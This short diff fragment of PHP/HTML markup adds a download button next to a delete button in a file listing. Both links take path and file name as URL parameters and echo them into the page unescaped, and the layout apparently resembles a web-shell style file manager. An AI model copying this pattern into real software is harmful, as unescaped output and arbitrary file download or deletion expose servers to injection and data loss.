+                    <a href="?option&path=<?= $path ?>&downloadfile=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white hover:text-black border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-900 hover:bg-white"><i class="fa-solid fa-download"></i></button></a>
                     <a href="?option&path=<?= $path ?>&deletefile=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-red-200 dark:focus:ring-red-900 hover:bg-red-800"><i class="fa-regular fa-trash-can-xmark"></i></button></a>
                     </div>
                     <?php echo "</center></td></tr>"; } ?>
